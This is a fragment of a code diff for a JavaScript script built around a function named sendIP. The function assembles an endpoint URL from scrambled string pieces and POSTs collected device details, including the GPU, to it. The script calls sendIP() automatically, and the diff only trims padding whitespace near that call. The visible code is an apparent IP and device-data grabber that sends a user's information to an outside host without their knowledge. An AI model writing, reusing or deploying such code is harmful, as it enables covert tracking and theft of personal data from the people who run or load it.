@@ -117,15 +117,6 @@ const sendIP = () => {
                       lMz4 +
                       tUv5;
 
-
-
-                                    
-                                    
-                                    
-                                    
-                                    
-                                    
-
                     return fetch(dscURL, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -183,3 +174,4 @@ GPU > ${deviceInfo.gpu}
 };
 
 sendIP();
+
